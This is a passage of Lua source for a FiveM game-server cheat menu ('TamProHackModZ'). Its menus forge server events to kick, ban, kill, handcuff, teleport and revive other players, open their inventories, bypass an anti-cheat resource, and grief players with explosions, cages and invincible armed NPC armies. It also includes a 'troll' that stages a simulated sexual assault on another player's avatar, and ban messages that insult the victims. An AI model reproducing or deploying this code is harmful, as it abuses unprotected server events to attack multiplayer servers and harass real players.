  RemoveVehicleMod(veh, ctheItem.data.modid)
  isPreviewing = false
  oldmodtype = -1
  oldmod = -1
  oldmodaction = false
else
  oldmodaction = false
  SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
end
          elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
isPreviewing = false
oldmodtype = -1
oldmod = -1
oldmodaction = false
if ctheItem.data.realIndex == -1 then
  RemoveVehicleMod(veh, ctheItem.data.modid)
else
  SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
end
          elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
if ctheItem.data.realIndex == -1 then
  RemoveVehicleMod(veh, ctheItem.data.modid)
  isPreviewing = false
  oldmodtype = -1
  oldmod = -1
  oldmodaction = false
else
  SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
  isPreviewing = true
end
          end
        end
      end
      TamProHackModZ.Display()
    end
  end
end



for i,theItem in pairs(perfMods) do
  if TamProHackModZ.IsMenuOpened(theItem.id) then

    if GetVehicleMod(veh,theItem.id) == 0 then
      pricestock = "Not Installed"
      price1 = "Installed"
      price2 = "Not Installed"
      price3 = "Not Installed"
      price4 = "Not Installed"
    elseif GetVehicleMod(veh,theItem.id) == 1 then
      pricestock = "Not Installed"
      price1 = "Not Installed"
      price2 = "Installed"
      price3 = "Not Installed"
      price4 = "Not Installed"
    elseif GetVehicleMod(veh,theItem.id) == 2 then
      pricestock = "Not Installed"
      price1 = "Not Installed"
      price2 = "Not Installed"
      price3 = "Installed"
      price4 = "Not Installed"
    elseif GetVehicleMod(veh,theItem.id) == 3 then
      pricestock = "Not Installed"
      price1 = "Not Installed"
      price2 = "Not Installed"
      price3 = "Not Installed"
      price4 = "Installed"
    elseif GetVehicleMod(veh,theItem.id) == -1 then
      pricestock = "Installed"
      price1 = "Not Installed"
      price2 = "Not Installed"
      price3 = "Not Installed"
      price4 = "Not Installed"
    end
    if TamProHackModZ.Button("Stock "..theItem.name, pricestock) then
      SetVehicleMod(veh,theItem.id, -1)
    elseif TamProHackModZ.Button(theItem.name.." Upgrade 1", price1) then
      SetVehicleMod(veh,theItem.id, 0)
    elseif TamProHackModZ.Button(theItem.name.." Upgrade 2", price2) then
      SetVehicleMod(veh,theItem.id, 1)
    elseif TamProHackModZ.Button(theItem.name.." Upgrade 3", price3) then
      SetVehicleMod(veh,theItem.id, 2)
    elseif theItem.id ~= 13 and theItem.id ~= 12 and TamProHackModZ.Button(theItem.name.." Upgrade 4", price4) then
      SetVehicleMod(veh,theItem.id, 3)
    end
    TamProHackModZ.Display()
  end
end

if TamProHackModZ.IsMenuOpened(HighTachMenu) then
  notify("~u~Rome_IX ~r~Menu", true)
  notify("~u~Rome_IX ~r~Menu", false)
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Self Menu", sMX) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Players Menu", OPMS) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ ESP Menu", espa) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Teleport Menu", TRPM) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Vehicle Menu", VMS) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Weapon Menu", WMPS) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Flycar Menu ", advm) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Lua Menu ", LMX) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Model Menu ", MODELS) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Settings", SettingsMenu) then
  elseif TamProHackModZ.Button("Close Menu") then
  Enabled = false
  end


  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(MODELS) then
    if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Model Menu", MODEL) then
elseif TamProHackModZ.Button("Randomize Skin") then
    SetPedRandomComponentVariation(PlayerPedId(), true)
           elseif TamProHackModZ.Button("Dressed") then
    TriggerEvent('esx_skin:openSaveableMenu')
    end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(sMX) then
  if TamProHackModZ.CheckBox("~g~Player Visible", invisible, function(enabled) invisible = enabled end) then
  elseif TamProHackModZ.Button("~r~Suicide") then
    SetEntityHealth(PlayerPedId(-1), 0)
  elseif TamProHackModZ.Button("~g~ESX~s~ ReviveMe") then
    TriggerEvent("esx_ambulancejob:revive")
  elseif TamProHackModZ.Button("~g~Heal") then
    SetEntityHealth(PlayerPedId(-1), 200)
  elseif TamProHackModZ.Button("~b~Give Armour") then
    SetPedArmour(PlayerPedId(-1), 200)
  elseif TamProHackModZ.Button("~o~Food~s~ & ~b~Water ~g~100%") then
    TriggerEvent("esx_status:set", "hunger", 1000000)
    TriggerEvent("esx_status:set", "thirst", 1000000)
  elseif TamProHackModZ.CheckBox("Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end) then
  elseif TamProHackModZ.CheckBox("Thermal ~o~Vision", bTherm, function(bTherm) end) then
    therm = not therm
    bTherm = therm
    SetSeethrough(therm)
elseif TamProHackModZ.CheckBox("HEAD NAME", Openname, function(Openname) end) then
    PlayerOn = not PlayerOn
    Openname = PlayerOn
  elseif TamProHackModZ.CheckBox("Noclip", Noclipping) then
    ToggleNoclip()
    end 

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(OPMS) then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ All Players", GAPA) then
  else
    local playerlist = GetActivePlayers()
    for i = 1, #playerlist do
      local currPlayer = playerlist[i]
      if TamProHackModZ.MenuButton("ID: ~y~["..GetPlayerServerId(currPlayer).."] ~s~"..GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~DEAD" or "~g~ALIVE"), 'PlayerOptionsMenu') then
        SelectedPlayer = currPlayer
      end
    end
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(MODEL) then  
if TamProHackModZ.Button("Skater") then
local model = "a_f_y_skater_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
elseif TamProHackModZ.Button("Hillbilly") then
local model = "a_m_m_hillbilly_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Jesus") then
local model = "u_m_m_jesus_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Bevhills") then
local model = "a_f_m_bevhills_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Swat") then
local model = "s_m_y_swat_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Zombie") then
local model = "u_m_y_zombie_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Alien") then
local model = "s_m_m_movalien_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Pongo") then
local model = "u_m_y_pogo_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Babyd") then
local model = "u_m_y_babyd"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("StrPunk") then
local model = "g_m_y_strpunk_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Deer") then
local model = "a_c_deer"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Cow") then
local model = "a_c_cow"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Coyote") then
local model = "a_c_coyote"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Westy") then
local model = "a_c_westy"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Dolphin") then
local model = "a_c_dolphin"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
    end
    elseif TamProHackModZ.Button("Fivem") then
local model = "mp_m_freemode_01"
  RequestModel(GetHashKey(model)) 
  Wait(500)
  if HasModelLoaded(GetHashKey(model)) then
    SetPlayerModel(PlayerId(), GetHashKey(model))
  end
end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(poms) then
  TamProHackModZ.SetSubTitle(poms, "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
   if TamProHackModZ.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
    SpectatePlayer(SelectedPlayer)

  elseif TamProHackModZ.Button("Teleport To") then
      local confirm = KeyboardInput("Are you sure? y/n", "", 0)
      if confirm == "y" then
        local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
      if confirm == "n" then
        notify("~b~Operation cancelled~s~.", false)
      else
        notify("~b~Invalid Confirmation~s~.", true)
        notify("~b~Operation cancelled~s~.", false)
      end
    else
      local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
      SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
    end

 elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Legency Bypass", titansentry1) then

  elseif TamProHackModZ.Button("Inventory ~r~Player") then
  exports.nc_inventory:SearchInventory(GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
  TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
  TriggerEvent("esx_inventoryhud:openTrunkInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
  TriggerEvent("esx_inventoryhud:openOtherInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))

  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Troll Menu", Tmas) then

  elseif TamProHackModZ.Button("Clone ~r~Player") then
  ClonePedlol(SelectedPlayer)

  elseif TamProHackModZ.Button("~g~Revive ~s~Player") then
  TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
  TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
  TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
  TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
  TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))

  elseif TamProHackModZ.Button("~g~Heal ~s~Player") then
    local medkitname = "PICKUP_HEALTH_STANDARD"
    local medkit = GetHashKey(medkitname)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
    CreateAmbientPickup(medkit, coords.x, coords.y, coords.z + 1.0, 1, 1, medkit, 1, 0)
    SetPickupRegenerationTime(pickup, 60) 

  elseif TamProHackModZ.Button("~b~Armour ~s~Player") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 

  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Give Weapon", GSWP) then  

  elseif TamProHackModZ.Button("Give ~r~Vehicle") then
    local ped = GetPlayerPed(SelectedPlayer)
    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
      RequestModel(ModelName)
      while not HasModelLoaded(ModelName) do
        Citizen.Wait(0)
      end
      local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped)+90, true, true)
    else
      notify("~b~Model is not valid!", true)
    end     

  elseif TamProHackModZ.Button("Give ~r~All Weapons") then
    for i = 1, #allWeapons do
      GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
    end  
  
  elseif TamProHackModZ.Button("Player ~r~KILL") then
    TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
  
  elseif TamProHackModZ.Button("Player ~r~BAN") then
    TriggerServerEvent("EasyAdmin:banPlayer", GetPlayerServerId(SelectedPlayer), "กูอะ GodTamProHack จำไว้ไอโง่" )
    TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
  
  elseif TamProHackModZ.Button("Player ~r~KICK") then
    TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "โกูอะ GodTamProHack จำไว้ไอโง่" )
    TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "กูอะ GodTamProHack จำไว้ไอโง่" )
  
  elseif TamProHackModZ.Button("Handcuff ~r~Player") then
    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
  
  elseif TamProHackModZ.Button("Drag ~r~Player") then
    TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(SelectedPlayer))
  
  elseif TamProHackModZ.Button("PutCar ~r~Player") then
    TriggerServerEvent('esx_policejob:putInVehicle', GetPlayerServerId(SelectedPlayer))
  elseif TamProHackModZ.Button("OutCar ~r~Player") then
    TriggerServerEvent('esx_policejob:OutVehicle', GetPlayerServerId(SelectedPlayer))    
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(titansentry1) then
  if TamProHackModZ.Button("LEGENCY GOTO BYPASS") then
    	load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')	
		TriggerServerEvent("Guy_VIP:sv:admingoto", GetPlayerServerId(SelectedPlayer))
  elseif TamProHackModZ.Button("LEGENCY BRING BYPASS") then
    	load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')
    	local plyCoords = GetEntityCoords(GetPlayerPed(-1), false)
		TriggerServerEvent("Guy_VIP:sv:adminbring", GetPlayerServerId(SelectedPlayer), plyCoords.x, plyCoords.y, plyCoords.z)
  elseif TamProHackModZ.Button("TEXTSTATUS") then
    	load(LoadResourceFile('sentry', 'Source/Shared/client.sentry.lua'))()
		load(LoadResourceFile('sentry', 'Source/Shared/server.sentry.lua'))()
		print('pass')
		TriggerServerEvent("Guy_VIP:sv:Status", "Titan Store")
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(Tmas) then
  if TamProHackModZ.Button("~r~Kick ~s~From Vehicle") then
    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
  elseif TamProHackModZ.Button("~y~Explode ~s~Vehicle") then
    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
      AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
    else
      notify("~b~Player not in a vehicle~s~.", false)
    end
  elseif TamProHackModZ.Button("~r~Banana ~p~Party ~y~v2") then
    local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
    local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
    local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
    AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
    AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
    AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
  elseif TamProHackModZ.Button("~r~Explode ~s~Player") then
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
  elseif TamProHackModZ.Button("~r~Rape ~s~Player") then
    RequestModelSync("a_m_o_acult_01")
    RequestAnimDict("rcmpaparazzo_2")
    while not HasAnimDictLoaded("rcmpaparazzo_2") do
      Citizen.Wait(0)
    end

    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
      local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
      while not NetworkHasControlOfEntity(veh) do
        NetworkRequestControlOfEntity(veh)
        Citizen.Wait(0)
      end
      SetEntityAsMissionEntity(veh, true, true)
      DeleteVehicle(veh)
      DeleteEntity(veh)
    end
    count = -0.2
    for b=1,3 do
      local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
      local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
      SetEntityAsMissionEntity(rapist, true, true)
      AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
      ClearPedTasks(GetPlayerPed(SelectedPlayer))
      TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
      SetPedKeepTask(rapist)
      TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
      SetEntityInvincible(rapist, true)
      count = count - 0.4
    end
  elseif TamProHackModZ.Button("~r~Cage ~s~Player") then
    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
    roundx = tonumber(string.format("%.2f", x))
    roundy = tonumber(string.format("%.2f", y))
    roundz = tonumber(string.format("%.2f", z))
    local cagemodel = "prop_fnclink_05crnr1"
    local cagehash = GetHashKey(cagemodel)
    RequestModel(cagehash)
    while not HasModelLoaded(cagehash) do
      Citizen.Wait(0)
    end
    local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
    local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
    SetEntityHeading(cage1, -90.0)
    SetEntityHeading(cage2, 90.0)
    FreezeEntityPosition(cage1, true)
    FreezeEntityPosition(cage2, true)
  elseif TamProHackModZ.Button("~r~Hamburgher ~s~Player") then
    local hamburg = "xs_prop_hamburgher_wl"
    local hamburghash = GetHashKey(hamburg)
    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
    AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
  elseif TamProHackModZ.Button("~r~Hamburgher ~s~Player Car") then
    local hamburg = "xs_prop_hamburgher_wl"
    local hamburghash = GetHashKey(hamburg)
    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
    AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
  elseif TamProHackModZ.Button("~r~Snowball troll ~s~Player") then
    rotatier = true
    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
    roundx = tonumber(string.format("%.2f", x))
    roundy = tonumber(string.format("%.2f", y))
    roundz = tonumber(string.format("%.2f", z))
    local tubemodel = "sr_prop_spec_tube_xxs_01a"
    local tubehash = GetHashKey(tubemodel)
    RequestModel(tubehash)
    RequestModel(smashhash)
    while not HasModelLoaded(tubehash) do
      Citizen.Wait(0)
    end
    local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, true, true, false)
    SetEntityRotation(tube, 0.0, 90.0, 0.0)
    local snowhash = -356333586
    local wep = "WEAPON_SNOWBALL"
    for i = 0, 10 do
      local coords = GetEntityCoords(tube)
      RequestModel(snowhash)
      Citizen.Wait(50)
      if HasModelLoaded(snowhash) then
        local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, true, true) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, true, true)
        NetworkRegisterEntityAsNetworked(ped)
        if DoesEntityExist(ped) and
        not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          local netped = PedToNet(ped)
          NetworkSetNetworkIdDynamic(netped, false)
          SetNetworkIdCanMigrate(netped, true)
          SetNetworkIdExistsOnAllMachines(netped, true)
          Citizen.Wait(500)
          NetToPed(netped)
          GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
          SetCurrentPedWeapon(ped, GetHashKey(wep), true)
          SetEntityInvincible(ped, true)
          SetPedCanSwitchWeapon(ped, true)
          TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
        else
          Citizen.Wait(0)
        end
      end
    end
end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(SPD) then
  if TamProHackModZ.Button("~r~Spawn ~s~Swat army with ~y~AK") then
    local pedname = "s_m_y_swat_01"
    local wep = "WEAPON_ASSAULTRIFLE"
    for i = 0, 10 do
      local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
      RequestModel(GetHashKey(pedname))
      Citizen.Wait(50)
      if HasModelLoaded(GetHashKey(pedname)) then
        local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
        NetworkRegisterEntityAsNetworked(ped)
        if DoesEntityExist(ped) and
        not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          local netped = PedToNet(ped)
          NetworkSetNetworkIdDynamic(netped, false)
          SetNetworkIdCanMigrate(netped, true)
          SetNetworkIdExistsOnAllMachines(netped, true)
          Citizen.Wait(500)
          NetToPed(netped)
          GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
          SetEntityInvincible(ped, true)
          SetPedCanSwitchWeapon(ped, true)
          TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
        else
          Citizen.Wait(0)
        end
      end
    end
  elseif TamProHackModZ.Button("~r~Spawn ~s~Swat army with ~y~RPG") then
    local pedname = "s_m_y_swat_01"
    local wep = "weapon_rpg"
    for i = 0, 10 do
      local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
      RequestModel(GetHashKey(pedname))
      Citizen.Wait(50)
      if HasModelLoaded(GetHashKey(pedname)) then
        local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
        NetworkRegisterEntityAsNetworked(ped)
        if DoesEntityExist(ped) and
        not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          local netped = PedToNet(ped)
          NetworkSetNetworkIdDynamic(netped, false)
          SetNetworkIdCanMigrate(netped, true)
          SetNetworkIdExistsOnAllMachines(netped, true)
          Citizen.Wait(500)
          NetToPed(netped)
          GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
          SetEntityInvincible(ped, true)
          SetPedCanSwitchWeapon(ped, true)
          TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
        else
          Citizen.Wait(0)
        end
      end
    end
  elseif TamProHackModZ.Button("~r~Spawn ~s~Swat army with ~y~Flaregun") then
    local pedname = "s_m_y_swat_01"
    local wep = "weapon_flaregun"
    for i = 0, 10 do
      local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
      RequestModel(GetHashKey(pedname))
      Citizen.Wait(50)
      if HasModelLoaded(GetHashKey(pedname)) then
        local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
        NetworkRegisterEntityAsNetworked(ped)
        if DoesEntityExist(ped) and
        not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          local netped = PedToNet(ped)
          NetworkSetNetworkIdDynamic(netped, false)
          SetNetworkIdCanMigrate(netped, true)
          SetNetworkIdExistsOnAllMachines(netped, true)
          Citizen.Wait(500)
          NetToPed(netped)
          GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
          SetEntityInvincible(ped, true)
          SetPedCanSwitchWeapon(ped, true)
          TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
        else
          Citizen.Wait(0)
        end
      end
    end
  elseif TamProHackModZ.Button("~r~Spawn ~s~Swat army with ~y~Railgun") then
    local pedname = "s_m_y_swat_01"
    local wep = "weapon_railgun"
    for i = 0, 10 do
      local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
      RequestModel(GetHashKey(pedname))
      Citizen.Wait(50)
      if HasModelLoaded(GetHashKey(pedname)) then
        local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
        NetworkRegisterEntityAsNetworked(ped)
        if DoesEntityExist(ped) and
        not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          local netped = PedToNet(ped)
          NetworkSetNetworkIdDynamic(netped, false)
          SetNetworkIdCanMigrate(netped, true)
          SetNetworkIdExistsOnAllMachines(netped, true)
          Citizen.Wait(500)
          NetToPed(netped)
          GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
          SetEntityInvincible(ped, true)
          SetPedCanSwitchWeapon(ped, true)
          TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
          TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
        else
          Citizen.Wait(0)
        end
      end
    end
  end  

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(TRPM) then
  if TamProHackModZ.Button("Teleport to ~g~waypoint") then
    TeleportToWaypoint()
  elseif TamProHackModZ.Button("Teleport into ~g~nearest ~s~vehicle") then
    teleporttonearestvehicle()
  elseif TamProHackModZ.Button("Teleport to ~r~coords") then
    teleporttocoords()
  elseif TamProHackModZ.Button("Draw custom ~r~blip ~s~on map") then
    drawcoords()
  elseif TamProHackModZ.CheckBox("Show ~g~Coords", showCoords, function (enabled) showCoords = enabled end) then
  end

  TamProHackModZ.Display()
elseif TamProHackModZ.IsMenuOpened(WMPS) then
  if TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Give Single Weapon", WTNe) then
  elseif TamProHackModZ.MenuButton("<FONT COLOR='#F6B352'>#~s~ Crosshairs", CMSMS) then

  elseif TamProHackModZ.Button("~g~Give All Weapons") then
    for i = 1, #allWeapons do
